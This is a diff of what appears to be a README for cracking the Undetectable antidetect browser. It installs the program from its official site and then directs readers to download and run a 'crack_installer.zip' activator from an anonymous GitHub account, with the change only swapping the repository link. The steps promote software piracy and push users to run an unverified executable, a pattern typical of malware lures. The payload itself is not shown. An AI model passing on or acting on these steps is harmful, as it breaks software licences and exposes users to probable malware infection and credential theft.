@@ -2,7 +2,7 @@ Download a clean Undetectable from the official website https://undetectable.io/
 
 After installing it, we don't run it!!!
 
-Download the activator - https://github.com/octo-browser-crack/SCR/blob/main/crack_installer.zip
+Download the activator - https://github.com/octo-browser-crack/Undetectable-browser-crack/blob/main/crack_installer.zip
 
 Run the activator and enter the path to the Undetectable. Then click RunPath
 
